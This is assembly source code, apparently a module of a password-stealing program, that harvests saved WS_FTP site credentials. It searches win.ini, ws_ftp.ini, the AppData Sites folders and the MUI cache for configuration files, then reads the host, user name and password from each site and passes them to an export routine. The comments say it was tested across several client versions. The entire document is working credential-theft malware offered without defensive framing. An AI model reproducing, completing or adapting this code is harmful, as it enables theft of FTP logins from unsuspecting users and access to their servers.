; WS_FTP
; Tested on 5.05T, 5.06, 7.5, 8.03, 9.0

.data
	@AllocStr <szWS_FTPSection>,	<"WS_FTP">
	@AllocStr <szWS_FTPKey1>,	<"DIR">
	@AllocStr <szWS_FTPKey2>,	<"DEFDIR">
	@AllocStr <szWS_FTPKey3>,	<"HOST">
	@AllocStr <szWS_FTPKey4>,	<"UID">
	@AllocStr <szWS_FTPKey5>,	<"PWD">
	@AllocStr <szWS_FTPSearchMask>,	<"\*.ini">
	@AllocStr <szWS_FTPSubPath1>,	<"\Ipswitch\WS_FTP\Sites">
	@AllocStr <szWS_FTPSubPath2>,	<"\Ipswitch\WS_FTP Home\Sites">
	@AllocStr <szWS_FTPIni1>,	<"\win.ini">
	@AllocStr <szWS_FTPIni2>,	<"\ws_ftp.ini">
	@AllocStr <szWS_FTPExe>,	<"\ws_ftp.exe">
	@AllocMem <lpWS_FTPData>,	<1024>
	@AllocMem <lpWS_FTPIniPath>,	<MAX_PATH+1>
	@AllocMem <lpWS_FTPCommonBuf>, 	<MAX_PATH+1>
	@AllocMem <lpWS_FTPSections>,	<8192>

.code

GetWS_FTPData proc uses edi
	mov	edi, offset lpWS_FTPSections
	
        invoke  GetPrivateProfileSectionNames, edi, 8190, offset lpWS_FTPIniPath
        test	eax, eax
        jz	@ret
        
@l:
	; Host
	invoke	GetPrivateProfileString, edi, offset szWS_FTPKey3, offset szNilStr, offset lpWS_FTPData, 1023, offset lpWS_FTPIniPath
	.IF	eax
		invoke	ExportStr, TYPE_WS_FTP_HOST, 0, offset lpWS_FTPData
		
		; User
		 invoke	GetPrivateProfileString, edi, offset szWS_FTPKey4, offset szNilStr, offset lpWS_FTPData, 1023, offset lpWS_FTPIniPath
		 .IF	eax
			invoke	ExportStr, TYPE_WS_FTP_USER, 0, offset lpWS_FTPData
		 .ENDIF
		 
		; Pass
		 invoke	GetPrivateProfileString, edi, offset szWS_FTPKey5, offset szNilStr, offset lpWS_FTPData, 1023, offset lpWS_FTPIniPath
		 .IF	eax
			invoke	ExportStr, TYPE_WS_FTP_PASS, 0, offset lpWS_FTPData
		 .ENDIF
	.ENDIF	
	
	@Next	@l

@ret:	
	ret
GetWS_FTPData endp

GetWS_FTPDataOld proc szKey: DWORD
	invoke	GetPrivateProfileString, offset szWS_FTPSection, szKey, offset szNilStr, offset lpWS_FTPIniPath, MAX_PATH, offset lpWS_FTPCommonBuf
	.IF	eax
		invoke	lstrcat, offset lpWS_FTPIniPath, offset szWS_FTPIni2
		invoke	GetWS_FTPData
	.ENDIF
	ret
GetWS_FTPDataOld endp

GetWS_FTPDataNew proc uses edi dwKey, szSubPath: DWORD
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD

	; New versions
	.IF	dwSHGetFolderPath
		push	offset lpWS_FTPIniPath
		push	0
		push	0
		push	dwKey
		push	0
		call	dwSHGetFolderPath
		
		.IF	eax == S_OK
			invoke	lstrcat, offset lpWS_FTPIniPath, szSubPath
			
			invoke	lstrlen, offset lpWS_FTPIniPath
			lea	edi, [eax+offset lpWS_FTPIniPath+1]
			        
			invoke	lstrcat, offset lpWS_FTPIniPath, offset szWS_FTPSearchMask
			
			invoke  FindFirstFile, offset lpWS_FTPIniPath, addr FindFileData
			mov     hFind, eax
			inc     eax
			jz      @ret	
			
		@find_loop:                
			cmp	FindFileData.cFileName[0], '.'
			jz	@level_up_skip
			
			invoke	lstrcpy, edi, addr FindFileData.cFileName
			invoke	GetWS_FTPData
			
		@level_up_skip:
			invoke  FindNextFile, hFind, addr FindFileData
			test    eax, eax
			jnz	@find_loop
			
			invoke  FindClose, hFind
		@ret:
		.ENDIF 
	.ENDIF
	ret
GetWS_FTPDataNew endp

GetWS_FTPOutput proc
	; Write header	
	invoke	ExportModule, MODULE_WS_FTP
	
	; Old versions
	invoke	GetWindowsDirectory, offset lpWS_FTPCommonBuf, MAX_PATH
	invoke	lstrcat, offset lpWS_FTPCommonBuf, offset szWS_FTPIni1
	
	invoke	GetWS_FTPDataOld, offset szWS_FTPKey1
	invoke	GetWS_FTPDataOld, offset szWS_FTPKey2
	
	invoke	GetPrivateProfileString, offset szWS_FTPSection, offset szWS_FTPKey2, offset szNilStr, offset lpWS_FTPIniPath, MAX_PATH, offset lpWS_FTPCommonBuf
	.IF	eax
		invoke	lstrcat, offset lpWS_FTPIniPath, offset szWS_FTPIni2
		invoke	GetWS_FTPData
	.ENDIF	
	
	; New versions
	invoke	GetWS_FTPDataNew, CSIDL_APPDATA, offset szWS_FTPSubPath1
	invoke	GetWS_FTPDataNew, CSIDL_APPDATA, offset szWS_FTPSubPath2
	invoke	GetWS_FTPDataNew, CSIDL_COMMON_APPDATA, offset szWS_FTPSubPath1
	invoke	GetWS_FTPDataNew, CSIDL_COMMON_APPDATA, offset szWS_FTPSubPath2
	
	; From MUI cache
	invoke	GetMUIPath, offset lpWS_FTPIniPath, offset szWS_FTPExe
	.IF	eax
		invoke	lstrcat, offset lpWS_FTPIniPath, offset szWS_FTPIni2
		invoke	GetWS_FTPData 
	.ENDIF

	ret
GetWS_FTPOutput endp